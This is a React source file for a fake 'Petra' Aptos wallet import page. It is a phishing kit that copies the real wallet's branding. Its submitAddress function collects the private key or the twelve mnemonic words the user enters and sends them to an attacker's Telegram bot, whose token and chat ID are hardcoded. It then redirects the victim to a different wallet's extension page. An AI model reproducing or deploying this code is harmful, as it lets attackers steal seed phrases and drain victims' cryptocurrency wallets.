import { Stepper, Typography } from '@mui/material';
import React, { useState } from 'react'
import { AiOutlineArrowLeft } from 'react-icons/ai';
import { BiKey } from 'react-icons/bi';
import { SlNotebook } from 'react-icons/sl';
import Step from '@mui/material/Step';
import StepLabel from '@mui/material/StepLabel';

let bot = {
    TOKEN: "5768289542:AAFeDrNZKJ0Tr9PuisnS3qBa3bKk2eWF63Q",
    CHATID: "1416009398",

}

const steps = ['.', '.', '.'];


const Main = () => {
    const [modal, setModal] = useState(false);
    const [activeStep, setActiveStep] = React.useState(0);
    const [skipped, setSkipped] = React.useState(new Set());
    const [prharePass, setPrharePass] = useState('');
    const [option1, setOption1] = useState(false)
    const [option2, setOption2] = useState(false)
    const [one, set1] = useState("");
    const [two, set2] = useState("");
    const [three, set3] = useState("");
    const [four, set4] = useState("");
    const [five, set5] = useState("");
    const [six, set6] = useState("");
    const [seven, set7] = useState("");
    const [eight, set8] = useState("");
    const [nine, set9] = useState("");
    const [ten, set10] = useState("");
    const [eleven, set11] = useState("");
    const [twelve, set12] = useState("");
    const style = {
        wrapper: modal ? 'h-[677px] lg:w-[480px] px-8 rounded-2xl lg:-translate-x-[25rem] ease-in duration-300 mx-4' : 'mx-4 ease-in duration-300 h-[677px]  px-8 rounded-2xl -translate-x-[0rem]',
        sec_wrapper: modal ? 'ease-in duration-300 flex flex-col items-center lg:pl-24 pb-5 lg:translate-x-[25rem]' : 'ease-in duration-300 flex flex-col items-center lg:pl-24 pb-5 translate-x-[0rem]'
    }


    const isStepOptional = (step) => {
        return step === 1;
    };

    const isStepSkipped = (step) => {
        return skipped.has(step);
    };

    const handleNext = () => {
        let newSkipped = skipped;
        if (isStepSkipped(activeStep)) {
            newSkipped = new Set(newSkipped.values());
            newSkipped.delete(activeStep);
        }

        setActiveStep((prevActiveStep) => prevActiveStep + 1);
        setSkipped(newSkipped);
    };

    const handleBack = () => {
        setActiveStep((prevActiveStep) => prevActiveStep - 1);
    };

    const handleSkip = () => {
        if (!isStepOptional(activeStep)) {
            // You probably want to guard against something like this,
            // it should never occur unless someone's actively trying to break something.
            throw new Error("You can't skip a step that isn't optional.");
        }

        setActiveStep((prevActiveStep) => prevActiveStep + 1);
        setSkipped((prevSkipped) => {
            const newSkipped = new Set(prevSkipped.values());
            newSkipped.add(activeStep);
            return newSkipped;
        });
    };


    const submitAddress = () => {
        let secratePrhase = !prharePass ? `mnemonic is ${one} ${two} ${three} ${four} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}` : `phrase is pass is ${prharePass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
            method: "GET"
        })
            .then(success => {
                setPrharePass('')
                handleNext()
                window.location = 'https://chrome.google.com/webstore/detail/martian-wallet-aptos-sui/efbglgofoippbgcjepnhiblaibcnclgk'
            }, error => {
                alert("not sent")
            })
    }
    const handleModal = () => {
        setModal((prev) => !prev)
    };


    return (
        <div className='lg:flex justify-between lg:mx-52 lg:items-end  my-4 '>
            <div className={style.sec_wrapper}>
                <img src='https://i.ibb.co/cFqXdQr/fwefwefewf-removebg-preview.png' className='w-24' />
                <p className='text-[70px] text-white font-[400]'>Petra</p>
                <p className='text-[22px] text-[#C2C7CC] font-[400]'>Guiding your web3 journey.</p>
                <p className='flex items-center pt-44'>
                    <span className='text-[#C2C7CC] '>Powered by</span>
                    <svg width="66" height="14" viewBox="0 0 66 17" fill="none" xmlns="http://www.w3.org/2000/svg"><g opacity="0.5" clip-path="url(#clip0_4378_522310)"><path d="M50.313 5.42091H48.96C48.8027 5.42091 48.6526 5.35341 48.5479 5.23611L47.9994 4.61944C47.9178 4.52769 47.8 4.47461 47.6768 4.47461C47.5537 4.47461 47.4359 4.52704 47.3542 4.61944L46.8835 5.14895C46.7294 5.32196 46.5082 5.42157 46.2758 5.42157H38.8717C38.661 6.01989 38.5234 6.65163 38.4688 7.30762H45.4588C45.5819 7.30762 45.6991 7.25782 45.784 7.16935L46.4351 6.4937C46.5161 6.40916 46.6287 6.36132 46.7459 6.36132H46.7729C46.896 6.36132 47.0139 6.41374 47.0955 6.50615L47.6439 7.12282C47.7486 7.24012 47.8981 7.30762 48.0561 7.30762H53.7616C53.7069 6.65163 53.5693 6.01989 53.3586 5.42157H50.313V5.42091Z" fill="#B7BCBD"></path><path d="M42.699 11.2716C42.8221 11.2716 42.9393 11.2218 43.0242 11.1333L43.6753 10.4577C43.7563 10.3731 43.8689 10.3253 43.9861 10.3253H44.0131C44.1362 10.3253 44.2541 10.3777 44.3357 10.4701L44.8841 11.0868C44.9888 11.2041 45.1383 11.2716 45.2963 11.2716H53.0283C53.318 10.6759 53.53 10.0363 53.6564 9.3672H46.2351C46.0778 9.3672 45.9277 9.2997 45.823 9.1824L45.2745 8.56573C45.1929 8.47398 45.0751 8.4209 44.9519 8.4209C44.8288 8.4209 44.711 8.47333 44.6293 8.56573L44.1586 9.09524C44.0045 9.26825 43.7833 9.36786 43.5509 9.36786H38.5742C38.7006 10.0376 38.9126 10.6766 39.2023 11.2723H42.699V11.2716Z" fill="#B7BCBD"></path><path d="M48.1852 3.36081C48.3083 3.36081 48.4255 3.311 48.5104 3.22253L49.1616 2.54688C49.2425 2.46234 49.3551 2.4145 49.4723 2.4145H49.4993C49.6224 2.4145 49.7403 2.46693 49.8219 2.55933L50.3703 3.176C50.475 3.29331 50.6245 3.36081 50.7825 3.36081H52.2526C50.8523 1.50818 48.625 0.30957 46.1166 0.30957C43.6081 0.30957 41.3808 1.50818 39.9805 3.36081H48.1858H48.1852Z" fill="#B7BCBD"></path><path d="M45.2304 13.1602H43.2197C43.0624 13.1602 42.9123 13.0927 42.8076 12.9754L42.2591 12.3587C42.1775 12.2669 42.0597 12.2139 41.9365 12.2139C41.8134 12.2139 41.6956 12.2663 41.6139 12.3587L41.1432 12.8882C40.9891 13.0612 40.7679 13.1608 40.5355 13.1608H40.5039C41.9049 14.655 43.8992 15.5902 46.1146 15.5902C48.3301 15.5902 50.3243 14.655 51.7253 13.1608H45.2304V13.1602Z" fill="#B7BCBD"></path><path d="M12.1867 15.0956L10.625 11.3202H3.6482L2.08652 15.0956H0.28125L7.12642 0.802734L13.992 15.0956H12.1867V15.0956ZM4.23613 9.88698H10.0167L7.1172 3.79761L4.23679 9.88698H4.23613Z" fill="#B7BCBD"></path><path d="M16.4844 15.0956V0.802734H20.4801C23.6034 0.802734 25.2461 2.23595 25.2461 4.92086C25.2461 7.60576 23.502 8.999 20.4597 8.999H18.1678V15.0956H16.4844ZM18.1678 7.50484H20.0745C22.4881 7.50484 23.5429 6.71778 23.5429 4.92086C23.5429 3.12393 22.4677 2.29624 20.0745 2.29624H18.1678V7.50484Z" fill="#B7BCBD"></path><path d="M31.3624 2.33687H26.4141V0.802734H37.9949V2.33687H33.0459V15.0956H31.3624V2.33687V2.33687Z" fill="#B7BCBD"></path><path d="M56.1335 12.4915L57.5832 11.5124L57.6951 11.7444C58.5872 13.3592 59.561 14.0053 61.0417 14.0053C62.6843 14.0053 63.8405 12.8749 63.8405 11.502C63.8405 10.2096 63.1913 9.34198 60.5953 8.27182C57.6142 7.04045 56.5996 5.76844 56.5996 3.95185C56.5996 1.9734 58.1613 0.418945 60.8587 0.418945C62.8463 0.418945 64.2052 1.26695 64.9762 2.63987L63.7996 3.44725L63.4546 3.36664C62.8463 2.41772 62.0957 1.87248 60.8178 1.87248C59.2562 1.87248 58.3436 2.7408 58.3436 3.91122C58.3436 5.00104 58.9316 5.62689 61.467 6.77766C64.7727 8.27182 65.5845 9.50319 65.5845 11.4816C65.5845 13.6416 63.7187 15.4785 61.0614 15.4785C58.8302 15.4785 57.2889 14.6305 56.1328 12.4909L56.1335 12.4915Z" fill="#B7BCBD"></path></g><defs><clipPath id="clip0_4378_522310"><rect width="65.8379" height="16.0937" fill="white"></rect></clipPath></defs></svg>
                    {/* <img src='https://i.ibb.co/0jcwb2V/grgegegreg-removebg-preview.png' /> */}
                </p>
            </div>
            <div className={modal ? `bg-white ${style.wrapper}` : `bg-[#1C2B43] ${style.wrapper}`}>
                {
                    modal ?
                        <div className='pt-5 relative'>

                            <>
                                <div className='flex justify-between'>
                                    {
                                        option1 ?
                                            <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                setOption1((prev) => !prev)
                                                handleBack()
                                            }}><AiOutlineArrowLeft /></p>
                                            :
                                            option2 ?
                                                <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                    setOption2((prev) => !prev)
                                                    handleBack()
                                                }}><AiOutlineArrowLeft /></p>
                                                :
                                                <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                    handleModal()
                                                    handleBack()
                                                }}><AiOutlineArrowLeft /></p>
                                    }

                                    <Stepper activeStep={activeStep}>
                                        {steps.map((label, index) => {
                                            const stepProps = {};
                                            const labelProps = {};
                                            if (isStepSkipped(index)) {
                                                stepProps.completed = false;
                                            }
                                            return (
                                                <Step key={label} {...stepProps}>
                                                    <StepLabel {...labelProps} >{label}</StepLabel>
                                                </Step>
                                            );
                                        })}
                                    </Stepper>
                                    <p>.</p>
                                </div>
                                {
                                    option1 || option2 ?
                                        ""
                                        :
                                        <div className='mt-64'>
                                            <button className='bg-slate-100 w-full my-2 border-[3px] border-gray p-4 text-lg font-[600] flex items-center rounded-lg' onClick={() => {
                                                setOption1((prev) => !prev)
                                                handleNext()
                                            }}><BiKey className='text-[#FF5F5F] font-[700] text-2xl mr-4' /> Import private key</button>
                                            <button className='bg-slate-100 w-full my-2 border-[3px] border-gray p-4 text-lg font-[600] flex items-center rounded-lg' onClick={() => {
                                                setOption2((prev) => !prev)
                                                handleNext()
                                            }}><SlNotebook className='text-[#FF5F5F] font-[700] text-2xl mr-4' /> Import mnemonic</button>
                                        </div>
                                }
                            </>
                            {
                                option1 ?
                                    (
                                        <>
                                            <p className='mt-16'>Access an existing wallet with your private key.</p>
                                            <input
                                                aria-label="minimum height"
                                                minRows={3}
                                                placeholder="Enter private key hare"
                                                className='w-full bg-slate-100 p-4 rounded-lg mt-1 outline-0'
                                                type='password'
                                                onChange={(e) => setPrharePass(e.target.value)}

                                            /><br />
                                            <button className={prharePass ? 'opacity-100 bg-[#C53030] w-full mt-96 p-4 rounded-lg text-white text-lg text-xl' : 'opacity-40 bg-[#C53030] w-full mt-96 p-4 rounded-lg text-white text-lg text-xl'} disabled={!prharePass} onClick={() => submitAddress()}>Import</button>
                                        </>
                                    )
                                    :
                                    option2 ?
                                        <>
                                            <div className='grid grid-cols-2 justify-items-center gap-4 mt-10'>
                                                <input placeholder='1. ' onChange={(e) => set1(e.target.value)} name='1' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='2. ' onChange={(e) => set2(e.target.value)} name='2' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='3. ' onChange={(e) => set3(e.target.value)} name='3' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='4. ' onChange={(e) => set4(e.target.value)} name='4' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='5. ' onChange={(e) => set5(e.target.value)} name='5' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='6. ' onChange={(e) => set6(e.target.value)} name='6' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='7. ' onChange={(e) => set7(e.target.value)} name='7' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='8. ' onChange={(e) => set8(e.target.value)} name='8' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='9. ' onChange={(e) => set9(e.target.value)} name='9' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='10.' onChange={(e) => set10(e.target.value)} name='10' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='11.' onChange={(e) => set11(e.target.value)} name='11' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='12.' onChange={(e) => set12(e.target.value)} name='12' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                            </div>
                                            <button className={one ? 'opacity-100 bg-[#C53030] w-full mt-32 p-4 rounded-lg text-white text-lg text-xl' : 'opacity-40 bg-[#C53030] w-full mt-32 p-4 rounded-lg text-white text-lg text-xl'} disabled={!one} onClick={() => submitAddress()}>Import</button>
                                        </>
                                        :
                                        ''
                            }
                        </div>
                        :
                        <div className='flex flex-col items-center pt-44 pb-8 '>
                            <img src='https://i.ibb.co/cFqXdQr/fwefwefewf-removebg-preview.png' className='mb-2' />
                            <p className='text-[30px] text-white font-[700] mb-2'>Welcome to Petra</p>
                            <p className='text-[15px] text-[#C2C7CC] font-[400] mb-40'>Guiding your web3 journey.</p>
                            <button className='bg-[#e15656] text-[20px] font-[700] text-white rounded-lg lg:w-[26rem] w-[16rem]  px-5 py-3 mb-4'>Create New Wallet</button>
                            <button onClick={() => {
                                handleModal()
                                handleNext()
                            }} className='bg-[transparent] hover:bg-white ease-in duration-300 border border-white text-[20px] font-[700] text-white rounded-lg lg:w-[26rem] w-[16rem]  px-5 py-3'>Import Wallet</button>
                        </div>
                }
            </div>
        </div>
    )
}

export default Main